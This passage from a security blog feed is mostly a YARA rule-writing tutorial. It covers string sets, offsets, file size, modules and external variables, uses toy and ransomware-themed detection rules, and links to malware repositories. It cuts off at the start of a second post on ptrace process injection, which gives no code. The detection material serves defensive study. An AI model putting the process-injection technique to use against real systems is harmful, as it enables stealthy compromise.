highlighter-rouge">\t</code>: Tab (HT, TAB)</li> <li><code class="language-plaintext highlighter-rouge">\n</code>: New Line (LF, NL)</li> <li><code class="language-plaintext highlighter-rouge">**\r</code>: **Return (CR)</li> <li><code class="language-plaintext highlighter-rouge">\f</code>: Form feed (FF)</li> <li><code class="language-plaintext highlighter-rouge">\a</code>: Alarm bell</li> <li><code class="language-plaintext highlighter-rouge">\xNN</code>: Character whose ordinal number is the given hexadecimal number</li> </ul> <p>These are the recognized character classes:</p> <ul> <li><code class="language-plaintext highlighter-rouge">\w</code>: Match a <em>word _character (alphanumeric plus “</em>”)</li> <li><code class="language-plaintext highlighter-rouge">\W</code>: Match a non-word character</li> <li><code class="language-plaintext highlighter-rouge">\s</code>: Match a whitespace character</li> <li><code class="language-plaintext highlighter-rouge">\S</code>: Match a non-whitespace character</li> <li><code class="language-plaintext highlighter-rouge">**\d</code>: Match a decimal digit character</li> <li><code class="language-plaintext highlighter-rouge">\D</code>: Match a non-digit character</li> <li><code class="language-plaintext highlighter-rouge">\b</code>: Match a word boundary</li> <li><code class="language-plaintext highlighter-rouge">\B</code>: Match except at a word boundary</li> </ul> <h2 id="sets-of-strings">Sets of strings</h2> <p>If the event where you want a certain number of strings from a list to be hit, you can implement the following:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule MigosPresent
+<span class="o">{</span>
+    strings:
+        <span class="nv">$m1</span> <span class="o">=</span> <span class="s2">"Quavo"</span>
+        <span class="nv">$m2</span> <span class="o">=</span> <span class="s2">"Offset"</span>
+        <span class="nv">$m3</span> <span class="o">=</span> <span class="s2">"Takeoff"</span>
+
+    condition:
+        2 of <span class="o">(</span><span class="nv">$m1</span>,<span class="nv">$m2</span>,<span class="nv">$m3</span><span class="o">)</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>If any of the two Migos members are present, then the Migos are present. You can also use wildcards to represent a set. Used this way, you would use the * wildcard.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule MigosPresent
+<span class="o">{</span>
+    strings:
+        <span class="nv">$m1</span> <span class="o">=</span> <span class="s2">"Quavo"</span>
+        <span class="nv">$m2</span> <span class="o">=</span> <span class="s2">"Offset"</span>
+        <span class="nv">$m3</span> <span class="o">=</span> <span class="s2">"Takeoff"</span>
+
+    condition:
+        2 of <span class="o">(</span><span class="nv">$m</span><span class="k">*</span><span class="o">)</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>To represent all variables in strings, you can use the them keyword.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule ThreeRappersPresent
+<span class="o">{</span>
+    strings:
+        <span class="nv">$m1</span> <span class="o">=</span> <span class="s2">"Quavo"</span>
+        <span class="nv">$m2</span> <span class="o">=</span> <span class="s2">"Offset"</span>
+        <span class="nv">$m3</span> <span class="o">=</span> <span class="s2">"Takeoff"</span>
+        <span class="nv">$q1</span> <span class="o">=</span> <span class="s2">"Cardi B"</span>
+
+    condition:
+        3 of them // equivalent to 3 of <span class="o">(</span><span class="nv">$*</span><span class="o">)</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>Any expression that returns a numeric value can be used. Here is an example of the keywords any and **all **being used.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule Squad
+<span class="o">{</span>
+    strings:
+        <span class="nv">$m1</span> <span class="o">=</span> <span class="s2">"Quavo"</span>
+        <span class="nv">$m2</span> <span class="o">=</span> <span class="s2">"Offset"</span>
+        <span class="nv">$m3</span> <span class="o">=</span> <span class="s2">"Takeoff"</span>
+        <span class="nv">$q1</span> <span class="o">=</span> <span class="s2">"Cardi B"</span>
+
+    condition:
+        3 of them // equivalent to 3 of <span class="o">(</span><span class="nv">$*</span><span class="o">)</span>
+        all of them
+        any of <span class="o">(</span><span class="nv">$*</span><span class="o">)</span> and 2 of <span class="o">(</span><span class="nv">$*</span><span class="o">)</span>    // Fancy way of using any <span class="k">in </span>a rule that requires 3.
+<span class="o">}</span>
+</code></pre></div></div> <h2 id="anonymous-strings-with-of-and-forof">Anonymous strings with of and for…of</h2> <p>If the event where you are not specifically referencing strings, you can just use $ to reference them all.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule AnonymousStrings
+<span class="o">{</span>
+    strings:
+        <span class="nv">$ </span><span class="o">=</span> <span class="s2">"dummy1"</span>
+        <span class="nv">$ </span><span class="o">=</span> <span class="s2">"dummy2"</span>
+
+    condition:
+        1 of them
+<span class="o">}</span>
+</code></pre></div></div> <h2 id="conditions">Conditions</h2> <p>Yara allows for boolean expressions via the operators, and, or, and not and relational. Arithmetic operators (+,-,*,,%) and bitwise operators (&amp;, |, «, », ~, ^) can also be used on numerical expressions.</p> <h3 id="boolean">Boolean</h3> <p>String identifiers can also be used within a condition, acting as a Boolean variables whose value depends on the presence or not of the associated string in a file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule Example
+<span class="o">{</span>
+    strings:
+        <span class="nv">$hero1a</span> <span class="o">=</span> <span class="s2">"Batman"</span>
+        <span class="nv">$hero1b</span> <span class="o">=</span> <span class="s2">"Robin"</span>
+        <span class="nv">$hero2a</span> <span class="o">=</span> <span class="s2">"Edward"</span>
+        <span class="nv">$hero2b</span> <span class="o">=</span> <span class="s2">"Alphonse"</span>
+
+    condition:
+        <span class="o">(</span><span class="nv">$hero1a</span> or <span class="nv">$hero1b</span><span class="o">)</span> and <span class="o">(</span><span class="nv">$hero2a</span> or <span class="nv">$hero2b</span><span class="o">)</span>
+<span class="o">}</span>
+</code></pre></div></div> <h2 id="counting-string-instances">Counting string instances</h2> <p>Sometimes we need to know not only if a certain string is present or not, but how many times the string appears in the file or process memory. The number of occurrences of each string is represented by a variable whose name is the string identifier but with a # character in place of the $ character. For example:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule Ransomware
+<span class="o">{</span>
+    strings:
+        <span class="nv">$a</span> <span class="o">=</span> <span class="s2">"encrypted"</span>
+        <span class="nv">$b</span> <span class="o">=</span> <span class="s2">"btc"</span>
+
+    condition:
+        <span class="c">#a == 2 and #b &gt; 2</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>This rule matches any file or process containing the string $a exactly two times, and more than two occurrences of string <code class="language-plaintext highlighter-rouge">$b</code>.</p> <h2 id="string-offsets-or-virtual-addresses">String offsets or virtual addresses</h2> <p>In the majority of cases, when a string identifier is used in a condition, we are willing to know if the associated string is anywhere within the file or process memory, but sometimes we need to know if the string is at some specific offset of the file or at some virtual address within the process address space. In such situtations the operator at is what we need.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule Offset
+<span class="o">{</span>
+    strings:
+        <span class="nv">$a</span> <span class="o">=</span> <span class="s2">"encrypted"</span>
+        <span class="nv">$b</span> <span class="o">=</span> <span class="s2">"btc"</span>
+
+    condition:
+        <span class="nv">$a</span> at 100 and <span class="nv">$b</span> at 200
+<span class="o">}</span>
+</code></pre></div></div> <p>If string <code class="language-plaintext highlighter-rouge">$a</code> is found at offset 100 within the file (or at virtual address 100 if applied to a running process), it will catch. The string <code class="language-plaintext highlighter-rouge">$b</code> should also be at offset 200. You can also use hexadecimal instead of decimal notation.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule Offset
+<span class="o">{</span>
+    strings:
+        <span class="nv">$a</span> <span class="o">=</span> <span class="s2">"encrypted"</span>
+        <span class="nv">$b</span> <span class="o">=</span> <span class="s2">"btc"</span>
+
+    condition:
+        <span class="nv">$a</span> at 0x64 and <span class="nv">$b</span> at 0xC8
+<span class="o">}</span>
+</code></pre></div></div> <p>While the at operator is very specific, you can use the **in **operator to specify a range the string can be located at.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule InExample
+<span class="o">{</span>
+    strings:
+        <span class="nv">$a</span> <span class="o">=</span> <span class="s2">"encrypted"</span>
+        <span class="nv">$b</span> <span class="o">=</span> <span class="s2">"btc"</span>
+
+    condition:
+        <span class="nv">$a</span> <span class="k">in</span> <span class="o">(</span>0..100<span class="o">)</span> and <span class="nv">$b</span> <span class="k">in</span> <span class="o">(</span>100..filesize<span class="o">)</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>String $a must be found at offset between 0-100, while string $b must be at an offset between 100 and the end of the file EOF.</p> <p>You can also get the offset or virtual address of the i-th occurrence of string $a by using @a[ i ]. The indexes are one-based, so the first occurrence would be @a[1], the second being @a[2], and so on. It doesn’t start at @a[0]. If you provide an index greater than the number of occurrences of the string, the result will be a NaN (Not a Number) value.</p> <h2 id="match-length">Match Length</h2> <p>For many regular expressions and hex strings containing jumps, the length of the match is variable. If you have the regular expression /fo*/ the strings “fo”, “foo” and “fooo” can be matches, all of them with a different length.</p> <p>You can use the length of the matches as part of your condition by using the character ! in front of the string identifier, in a similar way you use the @ character for the offset. !a[1] is the length for the first match of $a, !a[2] is the length for the second match, and so on. !a is a abbreviated form of !a[1].</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule Hak5
+<span class="o">{</span>
+    strings:
+        <span class="nv">$re1</span> <span class="o">=</span> /hack<span class="k">*</span>/    // Will catch on hacker, hacked, hack, hack<span class="k">*</span>
+
+    condition:
+        <span class="o">!</span>re1[1] <span class="o">==</span> 4 and <span class="o">!</span>re1[2] <span class="o">&gt;</span> 6
+<span class="o">}</span>
+</code></pre></div></div> <p>This will catch the following:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>We hack things. We are hackers.
+</code></pre></div></div> <p>The first instance of ‘hack’ is re1 and it’s equal to length 4. the second instance of ‘hack’ has at least length 6.</p> <h2 id="file-size">File size</h2> <p>String identifiers are not the only variables that can appear in the condition (in fact, rules can be defined without any string definition), there are other special variables that can be used as well. filesize holds the size of the file being scanned. The size is expressed in bytes.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule FileSizeExample
+<span class="o">{</span>
+    condition:
+       filesize <span class="o">&gt;</span> 200KB
+<span class="o">}</span>
+</code></pre></div></div> <p>We use the KB postfix to set the size in which the file will be caught on to 200KB. It automatically multiples the value of the constant by 1024. The MB postfix can be used to multiply the value by 2^20. Both prefixes can be used only with decimal constants.</p> <p><strong>[!] Important [!]</strong> - filesize **only works when the rule is applied to a file. If applied to a running process, it won’t ever match.</p> <h2 id="executable-entry_point">Executable entry_point</h2> <p>If the file is a <strong>Portable Executable</strong> (PE) or <strong>Executable and Linkable Format</strong> (ELF), this variable holds the raw offset of the executable’s entry point in case we are scanning a file. If we’re scanning a running process, the entry_point will hold the virtual address of the main executable’s entry point. _A typical use of this variable is to look for some pattern at the entry point to detect packers or simple file infectors. _The current way to use entry_point is by importing the lib for PE and/or ELF and use their respective functions. Yara’s entrypoint function is depreciated starting at version 3. This is how it looks pre-version 3.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule EntryPointExample1
+<span class="o">{</span>
+    strings:
+        <span class="nv">$a</span> <span class="o">=</span> <span class="o">{</span> E8 00 00 00 00 <span class="o">}</span>
+
+    condition:
+       <span class="nv">$a</span> at entrypoint
+<span class="o">}</span>
+
+rule EntryPointExample2
+<span class="o">{</span>
+    strings:
+        <span class="nv">$a</span> <span class="o">=</span> <span class="o">{</span> 9C 50 66 A1 ?? ?? ?? 00 66 A9 ?? ?? 58 0F 85 <span class="o">}</span>
+
+    condition:
+       <span class="nv">$a</span> <span class="k">in</span> <span class="o">(</span>entrypoint..entrypoint + 10<span class="o">)</span>
+<span class="o">}</span>
+</code></pre></div></div> <p><strong>[!] Important [!]</strong> Again, don’t use yara’s entrypoint. Import <code class="language-plaintext highlighter-rouge">PE</code> or <code class="language-plaintext highlighter-rouge">ELF</code> and use <code class="language-plaintext highlighter-rouge">pe.entry_point</code> and/or <code class="language-plaintext highlighter-rouge">elf.entry_point</code>.</p> <h2 id="accessing-data-at-a-given-position">Accessing data at a given position</h2> <p>If you want to read data from a specific offset and save it as a variable you can use one of the following:</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">int8</span><span class="p">(</span><span class="o">&lt;</span><span class="n">offset</span> <span class="n">or</span> <span class="k">virtual</span> <span class="n">address</span><span class="o">&gt;</span><span class="p">)</span>
+<span class="n">int16</span><span class="p">(</span><span class="o">&lt;</span><span class="n">offset</span> <span class="n">or</span> <span class="k">virtual</span> <span class="n">address</span><span class="o">&gt;</span><span class="p">)</span>
+<span class="n">int32</span><span class="p">(</span><span class="o">&lt;</span><span class="n">offset</span> <span class="n">or</span> <span class="k">virtual</span> <span class="n">address</span><span class="o">&gt;</span><span class="p">)</span>
+
+<span class="n">uint8</span><span class="p">(</span><span class="o">&lt;</span><span class="n">offset</span> <span class="n">or</span> <span class="k">virtual</span> <span class="n">address</span><span class="o">&gt;</span><span class="p">)</span>
+<span class="n">uint16</span><span class="p">(</span><span class="o">&lt;</span><span class="n">offset</span> <span class="n">or</span> <span class="k">virtual</span> <span class="n">address</span><span class="o">&gt;</span><span class="p">)</span>
+<span class="n">uint32</span><span class="p">(</span><span class="o">&lt;</span><span class="n">offset</span> <span class="n">or</span> <span class="k">virtual</span> <span class="n">address</span><span class="o">&gt;</span><span class="p">)</span>
+
+<span class="n">int8be</span><span class="p">(</span><span class="o">&lt;</span><span class="n">offset</span> <span class="n">or</span> <span class="k">virtual</span> <span class="n">address</span><span class="o">&gt;</span><span class="p">)</span>
+<span class="n">int16be</span><span class="p">(</span><span class="o">&lt;</span><span class="n">offset</span> <span class="n">or</span> <span class="k">virtual</span> <span class="n">address</span><span class="o">&gt;</span><span class="p">)</span>
+<span class="n">int32be</span><span class="p">(</span><span class="o">&lt;</span><span class="n">offset</span> <span class="n">or</span> <span class="k">virtual</span> <span class="n">address</span><span class="o">&gt;</span><span class="p">)</span>
+
+<span class="n">uint8be</span><span class="p">(</span><span class="o">&lt;</span><span class="n">offset</span> <span class="n">or</span> <span class="k">virtual</span> <span class="n">address</span><span class="o">&gt;</span><span class="p">)</span>
+<span class="n">uint16be</span><span class="p">(</span><span class="o">&lt;</span><span class="n">offset</span> <span class="n">or</span> <span class="k">virtual</span> <span class="n">address</span><span class="o">&gt;</span><span class="p">)</span>
+<span class="n">uint32be</span><span class="p">(</span><span class="o">&lt;</span><span class="n">offset</span> <span class="n">or</span> <span class="k">virtual</span> <span class="n">address</span><span class="o">&gt;</span><span class="p">)</span>
+</code></pre></div></div> <p>Default is little-endian. If you want to read a big-endian integer use the corresponding function ending in be.</p> <p>The <code class="language-plaintext highlighter-rouge">&lt;offset or virtual address&gt;</code> parameter can be any expression returning an unsigned integer, including the return value of one the uintXX functions itself.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule IsPE
+<span class="o">{</span>
+  condition:
+     // MZ signature at offset 0 and ...
+     uint16<span class="o">(</span>0<span class="o">)</span> <span class="o">==</span> 0x5A4D and
+     // ... PE signature at offset stored <span class="k">in </span>MZ header at 0x3C
+     uint32<span class="o">(</span>uint32<span class="o">(</span>0x3C<span class="o">))</span> <span class="o">==</span> 0x00004550
+<span class="o">}</span>
+</code></pre></div></div> <h2 id="forof-applying-one-condition-across-many-strings">for…of: Applying one condition across many strings</h2> <p>The <strong>boolean_expression</strong> is evaluated for every string in string_set and there must be at least num of them true. One can also exchange num with other keywords such as <strong>all or any</strong>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>any of <span class="o">(</span><span class="nv">$a</span>,<span class="nv">$b</span>,<span class="nv">$c</span><span class="o">)</span> : <span class="o">(</span> <span class="nv">$ </span>at elf.entry_point  <span class="o">)</span>
+</code></pre></div></div> <p>The <code class="language-plaintext highlighter-rouge">$</code> represents all of the strings in the set. In this example, it’s strings <code class="language-plaintext highlighter-rouge">$a</code>, <code class="language-plaintext highlighter-rouge">$b</code>, and <code class="language-plaintext highlighter-rouge">$c</code>.</p> <p>You can also employ the symbols <code class="language-plaintext highlighter-rouge">#</code> and <code class="language-plaintext highlighter-rouge">@</code> to make reference to the number of occurrences and the first offset of each string.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>all of them : <span class="o">(</span> <span class="c"># &gt; 3 )</span>
+<span class="k">for </span>all of <span class="o">(</span><span class="nv">$a</span><span class="k">*</span><span class="o">)</span> : <span class="o">(</span> @ <span class="o">&gt;</span> @b <span class="o">)</span>
+</code></pre></div></div> <h2 id="iterating-over-string-occurrences">Iterating over string occurrences</h2> <p>If you want to iterate over offsets and test a condition, one can do the following:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule Three_Peat
+<span class="o">{</span>
+    strings:
+        <span class="nv">$a</span> <span class="o">=</span> <span class="s2">"dummy1"</span>
+        <span class="nv">$b</span> <span class="o">=</span> <span class="s2">"dummy2"</span>
+
+    condition:
+        <span class="k">for </span>all i <span class="k">in</span> <span class="o">(</span>1,2,3<span class="o">)</span> : <span class="o">(</span> @a[i] + 10 <span class="o">==</span> @b[i] <span class="o">)</span>
+<span class="o">}</span>
+</code></pre></div></div> <p>This rule says that the first three occurrences of $b should be 10 bytes away from the first three occurrences of $a. Another way to write this is the following:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>all i <span class="k">in</span> <span class="o">(</span>1..3<span class="o">)</span> : <span class="o">(</span> @a[i] + 10 <span class="o">==</span> @b[i] <span class="o">)</span>
+</code></pre></div></div> <p>We can also use expression as well. In this example, we are iterating over every occurrence of <code class="language-plaintext highlighter-rouge">$a</code> (remember that <code class="language-plaintext highlighter-rouge">#a</code> represents the number of occurrences of <code class="language-plaintext highlighter-rouge">$a</code>). This rule is specifying that every occurrence of <code class="language-plaintext highlighter-rouge">$a</code> should be within the first 100 bytes of the file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>all i <span class="k">in</span> <span class="o">(</span>1..#a<span class="o">)</span> : <span class="o">(</span> @a[i] &lt; 100 <span class="o">)</span>
+</code></pre></div></div> <p>You can also set it so it’s a set amount of occurrence for the first 100 bytes.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>any i <span class="k">in</span> <span class="o">(</span>1..#a<span class="o">)</span> : <span class="o">(</span> @a[i] &lt; 100 <span class="o">)</span>
+<span class="k">for </span>2 i <span class="k">in</span> <span class="o">(</span>1..#a<span class="o">)</span> : <span class="o">(</span> @a[i] &lt; 100 <span class="o">)</span>
+</code></pre></div></div> <h2 id="referencing-other-rules">Referencing other rules</h2> <p>Just like in C when referencing functions, the function, or in this case the rule, must be defined prior to being used.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule Rule1
+<span class="o">{</span>
+    strings:
+        <span class="nv">$a</span> <span class="o">=</span> <span class="s2">"dummy1"</span>
+
+    condition:
+        <span class="nv">$a</span>
+<span class="o">}</span>
+
+rule Rule2
+<span class="o">{</span>
+    strings:
+        <span class="nv">$a</span> <span class="o">=</span> <span class="s2">"dummy2"</span>
+
+    condition:
+        <span class="nv">$a</span> and Rule1
+<span class="o">}</span>
+</code></pre></div></div> <h2 id="yara-essentials">Yara Essentials</h2> <h3 id="global-rules">Global Rules</h3> <p>Allows users to impose restrictions in all the rules. If you want all your rules to ignore the files that exceed a certain size limit, you could go rule by rule making the required modifications to their conditions, or just write a global rule like this one:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>global rule SizeLimit
+<span class="o">{</span>
+    condition:
+        filesize &lt; 2MB
+<span class="o">}</span>
+</code></pre></div></div> <p>You can define as many global rules as you want. They’ll run before the other rules.</p> <h3 id="private-rules">Private Rules</h3> <p>Private rules don’t have an output when they match. When paired with referencing other rules, this can allow for a cleaner output. Such that, to get to superMalicious, maybe one private rule is that file must be ELF. Once that is confirmed, then the next rule will execute. But we don’t want to see ELF, in output. We just want to know if it’s superMalicious or not. To create a private rule, just add private in front of rule.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>private rule PrivateRule
+<span class="o">{</span>
+    ...
+<span class="o">}</span>
+</code></pre></div></div> <h3 id="rule-tags">Rule tags</h3> <p>You can tag your rules in case you only want to see the output of type ruleName.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule TagsExample1 : Foo Bar Baz
+<span class="o">{</span>
+    ...
+<span class="o">}</span>
+
+rule TagsExample2 : Bar
+<span class="o">{</span>
+    ...
+<span class="o">}</span>
+</code></pre></div></div> <h3 id="metadata">Metadata</h3> <p>This allows for additional data to be stored in a rule.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule MetadataExample
+<span class="o">{</span>
+    meta:
+        my_identifier_1 <span class="o">=</span> <span class="s2">"Some string data"</span>
+        my_identifier_2 <span class="o">=</span> 24
+        my_identifier_3 <span class="o">=</span> <span class="nb">true
+
+    </span>strings:
+        <span class="nv">$my_text_string</span> <span class="o">=</span> <span class="s2">"text here"</span>
+        <span class="nv">$my_hex_string</span> <span class="o">=</span> <span class="o">{</span> E2 34 A1 C8 23 FB <span class="o">}</span>
+
+    condition:
+        <span class="nv">$my_text_string</span> or <span class="nv">$my_hex_string</span>
+<span class="o">}</span>
+</code></pre></div></div> <h3 id="using-modules">Using Modules</h3> <p>Some modules are officially distributed with YARA like PE and Cuckoo. They can be imported just like python, but add double quotes.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="sh">"</span><span class="s">pe</span><span class="sh">"</span>
+<span class="k">import</span> <span class="sh">"</span><span class="s">cuckoo</span><span class="sh">"</span>
+</code></pre></div></div> <p>Once imported, you can use the feature by using its name prior to the function.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pe</span><span class="p">.</span><span class="n">entry_point</span> <span class="o">==</span> <span class="mh">0x1000</span>
+<span class="n">cuckoo</span><span class="p">.</span><span class="nf">http_request</span><span class="p">(</span><span class="o">/</span><span class="n">someregexp</span><span class="o">/</span><span class="p">)</span>
+</code></pre></div></div> <h3 id="undefined-values">Undefined Values</h3> <p>Some values are left as undefined when they are ran. If the following rule executes on a file that’s of type ELF but it finds the string, it will result in something like TRUE &amp; Undefined.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="sh">"</span><span class="s">pe</span><span class="sh">"</span>
+
+<span class="n">rule</span> <span class="n">Test</span>
+<span class="p">{</span>
+  <span class="n">strings</span><span class="p">:</span>
+      <span class="err">$</span><span class="n">a</span> <span class="o">=</span> <span class="sh">"</span><span class="s">some string</span><span class="sh">"</span>
+
+  <span class="n">condition</span><span class="p">:</span>
+      <span class="err">$</span><span class="n">a</span> <span class="ow">and</span> <span class="n">pe</span><span class="p">.</span><span class="n">entry_point</span> <span class="o">==</span> <span class="mh">0x1000</span>
+<span class="p">}</span>
+</code></pre></div></div> <p>Be careful.</p> <h3 id="external-variables">External Variables</h3> <p>External variables allow you to define rules which depend on values provided from ‘the other side’.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule ExternalVariable1
+<span class="o">{</span>
+    condition:
+       ext_var <span class="o">==</span> 10
+<span class="o">}</span>
+</code></pre></div></div> <p>ext_var is an external variable whos value is assigned at runtime, (use -d on the command line and parameter of <strong>compile</strong> and match methods in yara-python). External variables could be of types: int, str, or boolean.</p> <p>External variables can be used with the operators: contains and <strong>matches</strong>. Contains returns true if the string contains the specified substring. <strong>Matches</strong> returns true if the string matches the given <strong>regular expression</strong>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule ExternalVariable2
+<span class="o">{</span>
+    condition:
+        string_ext_var contains <span class="s2">"text"</span>
+<span class="o">}</span>
+
+rule ExternalVariable3
+<span class="o">{</span>
+    condition:
+        string_ext_var matches /[a-z]+/
+<span class="o">}</span>
+</code></pre></div></div> <p>**Contains **is True for ExternalVariable2 and matches is True for ExternalVariable3</p> <p>You can also use regex modifiers along with the matches operator.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rule ExternalVariableExample5
+<span class="o">{</span>
+    condition:
+        /<span class="k">*</span> <span class="k">case</span> insensitive single-line mode <span class="k">*</span>/
+        string_ext_var matches /[a-z]+/is
+<span class="o">}</span>
+</code></pre></div></div> <p>This will match for case-insensitive due to the i.</p> <p>Remember, you must define all external variables at run-time. This can be done with the **-d **argument.</p> <h3 id="including-files">Including files</h3> <p>Of course, you can include other files in yara, using the C-type import, #include…but without the # and with double quotes. You can use relative paths, absolute paths, and if windows, paths with drives.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">include</span> <span class="sh">"</span><span class="s">Migos.yar</span><span class="sh">"</span>
+<span class="n">include</span> <span class="sh">"</span><span class="s">../CardiB.yar</span><span class="sh">"</span>
+<span class="n">include</span> <span class="sh">"</span><span class="s">/home/user/yara/IsRapper.yar</span><span class="sh">"</span>
+<span class="n">include</span> <span class="sh">"</span><span class="s">c:</span><span class="se">\\</span><span class="s">yara</span><span class="se">\\</span><span class="s">includes</span><span class="se">\\</span><span class="s">oldRappers.yar</span><span class="sh">"</span>
+<span class="n">include</span> <span class="sh">"</span><span class="s">c://yara/includes/oldRappers.yar</span><span class="sh">"</span>
+</code></pre></div></div> <h1 id="conclusions">Conclusions</h1> <p>Alright, now you know how to write some Yara Rules. Here’s some malware repos, rules, and tools that allow you to generate yara rules. If you install yarGen, just point it at the malware, and it will the write a signature for that malware. If you want to catch a family of malware, it’s better to generalize it across the entire family.</p> <h2 id="resources">Resources</h2> <h3 id="worm-descriptions">Worm Descriptions</h3> <ul> <li><a href="https://www.f-secure.com/v-descs/worm_w32_downadup_al.shtml">F-Secure: Worm W32 Downadup AL</a></li> <li><a href="https://www.f-secure.com/v-descs/worm_w32_downadup.shtml">F-Secure: Worm W32 Downadup</a></li> <li><a href="https://support.microsoft.com/en-us/help/962007/virus-alert-about-the-win32-conficker-worm">Microsoft Support: Win32 Conficker Worm Alert</a></li> <li><a href="https://www.f-secure.com/v-descs/worm_w32_downadup_a.shtml">F-Secure: Worm W32 Downadup A</a></li> <li><a href="https://www.f-secure.com/v-descs/worm_w32_downadup_gen.shtml">F-Secure: Worm W32 Downadup Gen</a></li> <li><a href="https://www.f-secure.com/v-descs/worm_w32_downaduprun_a.shtml">F-Secure: Worm W32 DownadupRun A</a></li> </ul> <h3 id="yara">Yara</h3> <ul> <li><a href="https://www.experts-exchange.com/questions/29042297/How-to-test-yara-rule.html">Experts Exchange: How to Test Yara Rules</a></li> <li><a href="https://www.securityartwork.es/2013/10/11/yara-101/">Security Artwork: Yara 101</a></li> <li><a href="https://stixproject.github.io/documentation/idioms/yara-test-mechanism/">STIX Project: Yara Test Mechanism</a></li> <li><a href="https://github.com/Neo23x0/yarGen">yarGen by Neo23x0</a></li> <li><a href="https://github.com/radare/radare2/blob/master/doc/yara.md">Radare2 Yara Documentation</a></li> <li><a href="https://www.bsk-consulting.de/2015/02/16/write-simple-sound-yara-rules/">BSK Consulting: Writing Simple Yara Rules - Part 1</a></li> <li><a href="https://www.bsk-consulting.de/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/">BSK Consulting: Writing Simple Yara Rules - Part 2</a></li> <li><a href="https://www.bsk-consulting.de/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/">BSK Consulting: Writing Simple Yara Rules - Part 3</a></li> </ul> <h3 id="xxd">xxd</h3> <ul> <li><a href="https://www.systutorials.com/docs/linux/man/1-xxd/">Linux Man Pages: xxd</a></li> </ul> <h3 id="malware-repos">Malware repos</h3> <ul> <li><a href="https://github.com/Malshare/MalShare-Toolkit.git">MalShare</a></li> </ul> <h3 id="malware-submission">Malware Submission</h3> <ul> <li><a href="https://www.virustotal.com/">VirusTotal</a></li> </ul>]]></content><author><name></name></author><category term="blog"/><category term="snort"/><category term="hacking"/><category term="yara"/><category term="reverse"/><summary type="html"><![CDATA[Tutorial on Creating Yara Rules]]></summary></entry><entry><title type="html">Injecting a Running Process</title><link href="https://real0day.github.io//blog/2017/injecting-a-running-process/" rel="alternate" type="text/html" title="Injecting a Running Process"/><published>2017-11-07T21:28:16+00:00</published><updated>2017-11-07T21:28:16+00:00</updated><id>https://real0day.github.io//blog/2017/injecting-a-running-process</id><content type="html" xml:base="https://real0day.github.io//blog/2017/injecting-a-running-process/"><![CDATA[<h2 id="introduction">Introduction</h2> <p><img src="/assets/img/injection-fairy-lily.png" alt="Injection Fairy Lily" title="Injection Fairy Lily" class="featured-image"/> Injection Fairy Lily from Yu-gi-oh!</p> <p>Special Thanks to the OP of Tutorial <strong>0x00pf pico</strong> (<a href="https://0x00sec.org/u/0x00pf">0x00pico</a>) for creating the tutorial that I followed.</p> <p>Learn more:</p> <ul> <li><a href="https://0x00sec.org/t/linux-infecting-running-processes/1097">Original Tutorial</a></li> <li><a href="https://twitter.com/0x00pico">Twitter Profile</a></li> </ul> <hr/> <h2 id="background">Background</h2> <p>For some time now, I’ve been curious as to how Metasploit can inject itself into running processes to hide itself. I’ve also been curious as to how debuggers worked, but I spent most of my time learning how to use them and understanding the structure of programs. Through this exercise, I was able to learn about <code class="language-plaintext highlighter-rouge">ptrace</code> and <code class="language-plaintext highlighter-rouge">SIGTRAPs</code>. There’s always another, deeper, rabbit hole. 🐇</p> <h3 id="process-breakdown">Process Breakdown:</h3> <ol> <li>Attach to a current running process by gathering its PID.</li> <li>Send a <code class="language-plaintext highlighter-rouge">SIGSTOP</code> to the program to 